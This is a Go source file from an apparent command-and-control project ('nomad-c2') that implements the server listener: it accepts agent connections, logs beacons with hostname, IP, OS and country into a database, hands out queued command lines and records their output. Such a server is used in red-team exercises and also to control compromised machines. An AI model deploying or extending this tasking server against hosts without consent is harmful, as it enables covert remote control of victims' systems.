package c2

import (
	"bufio"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"nomad-c2/server/db"
	"time"
)

func StartListener(port string) {
	ln, err := net.Listen("tcp", ":"+port)
	if err != nil {
		log.Fatalf("Error starting listener: %v", err)
	}
	defer ln.Close()

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Error accepting connection: %v", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	log.Printf("[+] New connection from %s", conn.RemoteAddr().String())

	reader := bufio.NewReader(conn)
	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			log.Printf("[-] Connection closed for %s", conn.RemoteAddr().String())
			return
		}

		var packet Packet
		if err := json.Unmarshal([]byte(message), &packet); err != nil {
			log.Printf("Error unmarshaling packet: %v", err)
			continue
		}

		handlePacket(conn, packet)
	}
}

func handlePacket(conn net.Conn, packet Packet) {
	switch packet.Type {
	case TypeBeacon:
		var payload BeaconPayload
		json.Unmarshal(packet.Payload, &payload)
		
		fmt.Printf("[*] Beacon from %s (%s)\n", packet.AgentID, payload.Hostname)
		
		// Update DB & Redis
		_, err := db.DB.Exec(`
			INSERT INTO agents (id, hostname, ip, os, country_code, last_seen, status)
			VALUES ($1, $2, $3, $4, $5, $6, $7)
			ON CONFLICT (id) DO UPDATE SET last_seen = $6, status = $7`,
			packet.AgentID, payload.Hostname, payload.IP, payload.OS, payload.CountryCode, time.Now(), "Live")
		if err != nil {
			log.Printf("Error updating agent in DB: %v", err)
		}

		// Check for pending commands
		checkCommands(conn, packet.AgentID)

	case TypeResponse:
		var payload ResponsePayload
		json.Unmarshal(packet.Payload, &payload)
		
		fmt.Printf("[*] Response for Command %d from %s\n", payload.CommandID, packet.AgentID)
		
		_, err := db.DB.Exec("UPDATE commands SET response = $1, status = 'Done' WHERE id = $2", payload.Output, payload.CommandID)
		if err != nil {
			log.Printf("Error updating command response: %v", err)
		}
	}
}

func checkCommands(conn net.Conn, agentID string) {
	var cmdID int
	var cmdLine string
	err := db.DB.QueryRow("SELECT id, command FROM commands WHERE agent_id = $1 AND status = 'Pending' ORDER BY created_at ASC LIMIT 1", agentID).Scan(&cmdID, &cmdLine)
	if err == nil {
		// Found a command, send it
		packet := Packet{
			Type:    TypeCommand,
			AgentID: agentID,
		}
		cmdPayload := CommandPayload{ID: cmdID, Line: cmdLine}
		payloadBytes, _ := json.Marshal(cmdPayload)
		packet.Payload = payloadBytes

		packetBytes, _ := json.Marshal(packet)
		conn.Write(append(packetBytes, '\n'))
		
		db.DB.Exec("UPDATE commands SET status = 'Sent' WHERE id = $1", cmdID)
	}
}
